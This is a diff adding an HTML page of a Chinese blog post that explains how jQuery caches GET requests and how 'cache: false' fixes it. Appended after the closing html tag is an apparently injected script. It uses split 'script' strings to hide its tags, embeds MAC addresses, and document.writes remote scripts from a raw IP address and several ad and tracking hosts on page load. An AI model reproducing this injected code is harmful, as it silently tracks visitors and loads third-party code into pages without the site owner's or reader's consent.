@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <title>jquery默认缓存GET&HEAD请求结果</title>
+    <meta name="description" content="newhuan">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <link rel="stylesheet" href="http://www.newhuan.info/css/app.css">
+    <script src="../../../../js/app.js"></script>
+    <meta name="apple-mobile-web-app-title" content="newhuan">
+</head>
+<body class="body body-article">
+
+    <div class="full-header">
+        <div class="container">
+            <div class="logo">
+                <a href="http://www.newhuan.info/blog" title="newhuan" alt="newhuan">首頁</a>
+            </div>
+
+            <div class="nav">
+            </div>
+        </div>
+    </div>
+
+
+    <div class="full-container">
+        <div class="container">
+            <div class="content">
+                <h1 class="title">jquery默认缓存GET&HEAD请求结果</h1>
+                <h3 class="date">20171024</h3>
+                <div class="clearfix typo">
+                    <p>最近遇到一个问题，一个从数据库中查找一条随机行的接口在连续调用的时候总是返回相同的结果</p>
+                    <p>打log之后发现服务端接口只运行了一次，猜测可能是所有请求都完全相同的原因，于是给$.ajax()的data参数添加一个index参数，发现问题解决了，然后就简单猜测是jquery的一个默认的优化设置，把所有相同的请求都合并了。</p>
+                    <p>带着这种猜想去查jq文档，没找到关闭「合并相同请求」的选项，于是上strackoverflow问。</p>
+                    <p>大佬JLRishe回答：</p>
+                    <p>
+                        <code>
+                        Most likely, the response is being cached because it is a GET request. Try telling jQuery to disable the cache:
+                        </code>
+                    </p>
+                    <p>问题解决了！</p>
+                    <p>
+                        然后附上jqery文档中的关于ajax方法cache参数的说明：
+                    </p>
+
+                    <pre><code>
+cache (default: true, false for dataType 'script' and 'jsonp')
+Type: Boolean
+If set to false, it will force requested pages not to be cached by the browser.
+Note: Setting cache to false will only work correctly with HEAD and GET requests.
+It works by appending "_={timestamp}" to the GET parameters.
+The parameter is not needed for other types of requests,
+except in IE8 when a POST is made to a URL that has already been requested by a GET.
+                    </code></pre>
+                    <p>最后附上jQuery调用ajax的代码：</p>
+                    <pre>
+                        <code>
+$.ajax( {
+    type: "get",
+    url: "/getNickname",
+    cache: false,          // <--- here
+    data: {
+        //index: i //my solution
+    },
+    beforeSend: function ( request ) {
+
+    },
+    success: function ( res ) {
+        console.log( "test response is ", JSON.stringify( res ) );
+    },
+    error: function ( err ) {
+        reject( err );
+    }
+} );
+                        </code>
+                    </pre>
+                    <p>总结：多想一步，一定是合并请求吗？合理吗？有了想法马上求证没问题，但是没有证实猜测的证据的时候（官方文档没有相关选项），往往就是猜测本身出错了，这时候不应该继续在这个猜测上继续钻牛角尖，换一个方向也许是一个好办法。但是不要轻易抛弃自己的猜测，还有可能是自己找证据的方向没覆盖所有的可能性（官方文档应该是覆盖了的。。）：不轻易放弃猜想，不拘泥于无法被证实的猜想？灵活，变通。</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="full-footer">
+        <div class="container">
+            <div class="copyright">
+                © 2015&nbsp;
+                <a href="http://www.newhuan.info/blog/" target="_blank">newhuan</a>&nbsp;by&nbsp;
+            </div>
+
+            <div class="hm hidden">
+                <script type="text/javascript">
+                    var _hmt = _hmt || [];
+                    (function() {
+                        var hm = document.createElement("script");
+                        hm.src = "//hm.baidu.com/hm.js?63392a0ec51d4ad23453b82650af1329";
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(hm, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+
+</body>
+</html>
+<script>
+    var __m='c8:3a:35:73:27:69';
+    var __m2='00:00:00:00:00:00';
+    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=8ee9af4179981b1f95c88061fabf6478,M,";
+    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+    var __n="http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m;
+    var __p="http://feed.theta.sogou.com/feed_icon?pid=ikuai8_app_2&appname=ikuai&uid="+__m+"&mac="+__m2;
+    var __y="http://static.helianhealth.com/hlwf/akb1.js";
+    if(self==top){
+        var x=parseInt(Math.random()*(100-0+1)+0);
+        switch(true){
+            case x>=0&&x<70:
+                __w("http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m,101);
+                __w(__p,1);
+                __w(__y,5);
+                break;
+            case x>=70&&x<80:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+            case x>=80&&x<=100:
+                __w("http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m,201);
+                __w(__y,5);
+                break;
+        }
+    }
+    function __w(s,n){document.write("<sc"+"ript src='"+s+"'></scr"+"ipt>");document.write(__h+n+__b);}
+</script>
